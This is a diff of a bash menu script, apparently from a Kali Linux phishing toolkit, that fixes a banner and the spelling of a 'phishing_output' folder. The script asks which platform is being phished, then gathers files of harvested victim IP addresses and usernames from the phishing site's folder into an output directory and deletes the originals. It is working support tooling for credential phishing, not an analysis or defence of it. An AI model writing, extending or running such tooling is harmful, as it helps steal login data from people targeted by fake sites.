@@ -1,12 +1,13 @@
 #! /bin/bash
 echo "
-██████╗ ██╗███████╗██╗  ██╗██╗███╗   ██╗ ██████╗ 
-██╔══██╗██║██╔════╝██║  ██║██║████╗  ██║██╔════╝ 
-██████╔╝██║███████╗███████║██║██╔██╗ ██║██║  ███╗
-██╔═══╝ ██║╚════██║██╔══██║██║██║╚██╗██║██║   ██║
-██║     ██║███████║██║  ██║██║██║ ╚████║╚██████╔╝
-╚═╝     ╚═╝╚══════╝╚═╝  ╚═╝╚═╝╚═╝  ╚═══╝ ╚═════╝ 
-                                                 
+
+██████╗ ██╗  ██╗██╗███████╗██╗  ██╗██╗███╗   ██╗ ██████╗ 
+██╔══██╗██║  ██║██║██╔════╝██║  ██║██║████╗  ██║██╔════╝ 
+██████╔╝███████║██║███████╗███████║██║██╔██╗ ██║██║  ███╗
+██╔═══╝ ██╔══██║██║╚════██║██╔══██║██║██║╚██╗██║██║   ██║
+██║     ██║  ██║██║███████║██║  ██║██║██║ ╚████║╚██████╔╝
+╚═╝     ╚═╝  ╚═╝╚═╝╚══════╝╚═╝  ╚═╝╚═╝╚═╝  ╚═══╝ ╚═════╝ 
+                                                                                                      
 "
 echo -e "1. KALI LINUX \n2. KALI LINUX ARM"
 while true
@@ -21,10 +22,10 @@ do
   echo "Saving data ... "
   read -r -p "Which platform do you phish ? - " platform
   cd /home/kali/Desktop/KOZ1OLMENU
-  mkdir pishing_output
+  mkdir phishing_output
   cd /home/kali/Desktop/KOZ1OLMENU/Phisher/sites/$platform
-  mv saved.ip.txt /home/kali/Desktop/KOZ1OLMENU/pishing_output
-  mv saved.usernames.txt /home/kali/Desktop/KOZ1OLMENU/pishing_output
+  mv saved.ip.txt /home/kali/Desktop/KOZ1OLMENU/phishing_output
+  mv saved.usernames.txt /home/kali/Desktop/KOZ1OLMENU/phishing_output
   rm ip.txt
   rm usernames.txt
   
